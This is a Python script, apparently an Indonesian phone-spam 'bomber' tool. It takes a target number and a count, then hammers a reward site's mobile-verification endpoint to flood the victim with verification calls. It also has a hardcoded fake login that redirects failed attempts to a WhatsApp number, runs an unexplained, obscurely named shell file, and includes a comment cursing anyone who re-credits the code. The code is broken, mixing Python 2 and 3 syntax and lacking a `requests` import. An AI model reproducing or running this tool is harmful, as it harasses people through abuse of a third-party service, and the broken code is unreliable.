# -*- coding: utf-8 -*-
import os, sys, time, datetime, random, hashlib, re, threading, json, getpass, urllib
from multiprocessing.pool import ThreadPool

#hay manusia udah nyampe di sini ea  ubah author ataupun ngerecode semoga emak bapaknya mati dalam keadaan mengenaskan
#buat yg nyampe di sini cuman buat mempelajari pemrograman dan beberapa fungsinya ane ucapin selamat berjuang
#tapi awaslu yg nge recode ataupun mengganti author

def tik():
    titik = [
     '   ', '.  ', '.. ', '...', '.. ', '.  ', '   ']
    for o in titik:
        print '\r\x1b[1;91m     [\xe2\x97\x8f] \x1b[1;92mLoading \x1b[1;97m' + o,
        sys.stdout.flush()
        time.sleep(0.7)

def wa():
    os.system('xdg-open https://api.whatsapp.com/send?phone=62895704349609&text=Assalamualaikum')

def ressture():
   os.system('clear')
   print '\x1b[1;33m╔╦══════════════════════════════════╗\n║║ Sudah punya ID dan Password nya? ║\n╚╣╔═════════════════════════════════╝\n╔╝╚═════════════════════╗'
   print '\x1b[1;33m║LOGIN UNTUK MELANJUTKAN║\n╠═══════════════════════╝'
   user = raw_input('║ID      : ')
   import getpass
   sandi = raw_input('║PW      : ')
   if sandi == 'channel pajaoq' and user == 'subscribe':
      print '║LOGIN SUKSES\n╚═══════\x1b[1;91m▶'
      sys.exit
   else:
      print 'Login GAGAL, Silahkan hubungi ADMIN'
      time.sleep(1)
      wa()
      ressture()

def loding2():
    looding2 = [
     '[|]', '[/]', '[-]', '[\]', '[|]', '[/]', '[-]', '[\]', '[|]', '[/]', '[-]', '[\]', '[|]', '[/]', '[-]', '[\]', '[|]', '[/]', '[-]', '[\]', '[|]', '[/]', '[-]', '[\]', '[|]', '[/]', '[-]', '[\]', '[|]', '[/]', '[-]', '[\]', '[|]', '[/]', '[-]', '[\]', '[|]', '[/]', '[-]', '[\]', '[|]', '[/]', '[-]', '[\]', '[|]', '[/]', '[-]', '[\]', '[|]', '[/]', '[-]', '[\]', '[|]', '[/]', '[-]', '[\]', '[|]', '[/]', '[-]', '[\]', '[|]', '[/]', '[-]', '[\]', '[|]', '[/]', '[-]', '[\]', '[|]', '[/]', '[-]', '[\]', '[|]', '[/]', '[-]', '[\]', '[|]', '[/]', '[-]', '[\]', '[|]', '[/]', '[-]', '[\]', '[|]', '[/]', '[-]', '[\]', '[|]', '[/]', '[-]', '[\]', '[|]', '[/]', '[-]', '[\]', '[|]', '[/]', '[-]', '[\]', '[|]', '[/]', '[-]', '[\]', '[|]', '[/]', '[-]', '[\]', '[|]', '[/]', '[-]', '[\]', '[|]', '[/]', '[-]', '[\]', '[|]', '[/]', '[-]', '[\]', '[|]', '[\033[1;32m✓\033[0m]\n']
    for o in looding2:
        print '\r\x1b[1;91m[\xe2\x97\x8f] \x1b[1;92mCheck \x1b[1;97m' + o,
        sys.stdout.flush()
        time.sleep(0.1)
        

ressture()
os.system('sh hsowkaksisisiaiowowkwkaiske')

banner= """
\033[1;90m<▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬>
 \033[1;90m[\033[1;96m•\033[1;90m] \033[1;93mAuthor    \033[1;91m: \033[1;92mMR.L4M3R
 \033[1;90m[\033[1;96m•\033[1;90m] \033[1;93mYouTube   \033[1;91m: \033[1;92mMR.L4M3RXploit
 \033[1;90m[\033[1;96m•\033[1;90m] \033[1;93mGithub    \033[1;91m: \033[1;92mgithub.com/MR-L4M3R
\033[1;90m<▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬>"""
os.system("clear")
print(banner)
print(" \033[1;90m[\033[1;96m~\033[1;90m] \033[1;95mExample \033[1:91m: \033[1;93m8********")
nomor = input(" \033[1;90m[\033[1;95m+\033[1;90m] \033[1;96mNomor Target \033[1;90m=\033[1;95m=\033[1;96m> \033[1;92m")
jumlah = int(input(" \033[1;90m[\033[1;95m+\033[1;90m] \033[1;96mTotal Spam \033[1;90m=\033[1;95m=\033[1;96m> \033[1;92m"))

url = "https://id.jagreward.com/member/verify-mobile/"
ua = {'Host': "id.jagreward.com",'Connection': "keep-alive",'User-Agent': 'Mozilla/5.0 (Linux; Android 8.1.0; vivo 1724) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.73 Mobile Safari/537.36'}
dat = {"method": "CALL","countryCode": "id",}

for i in range(jumlah):
    send = requests.post(url+nomor, headers=ua, data=dat)
    print(" \033[1;90m[\033[1;92m•\033[1;90m] \033[1;96mStatus \033[1;90m~\033[1;96m+\033[1;92m> \033[1;95m",(send.json()["message"]))
